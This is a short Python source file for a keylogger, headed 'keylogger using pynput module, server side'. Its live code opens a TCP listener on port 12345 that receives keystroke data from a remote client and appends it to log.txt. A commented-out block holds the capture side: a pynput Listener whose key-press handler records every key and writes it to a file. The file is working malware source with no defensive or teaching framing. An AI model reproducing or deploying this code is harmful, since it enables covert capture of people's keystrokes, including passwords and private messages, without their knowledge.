# keylogger using pynput module
# server side

# import socket to make 2 way communication 
import socket

s= socket.socket()

host = "192.168.0.10"
port = 12345

s.bind(('',port))
s.listen(2)

print("socket is listening")

def write_file(keys):
    with open('log.txt', 'a') as f:

        for key in keys:
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)

conn, address = s.accept()

while True :
    
    data = conn.recv(1024).decode()
    write_file(str(data))

    if not data:
        break

    print("String",str(data))

conn.close()
























# def on_press(key):
#     keys.append(key)
#     write_file(keys)

#     try:
#         print('alphanumeric key {0} pressed'.format(key.char))

#     except AttributeError:
#         print('special key {0} pressed'.format(key))


# def write_file(keys):
#     with open('log.txt', 'w') as f:
#         for key in keys:
            # removing ''

            # k = str(key).replace("'", "")
            # f.write(key)


#             # every keystroke for readability
#             f.write(' ')

# def on_release(key):
#     print('{0} released'.format(key))
#     if key == Key.esc:
#         # Stop listener
#         return False


# with Listener(on_press=on_press,
#               on_release=on_release) as listener:
#     listener.join()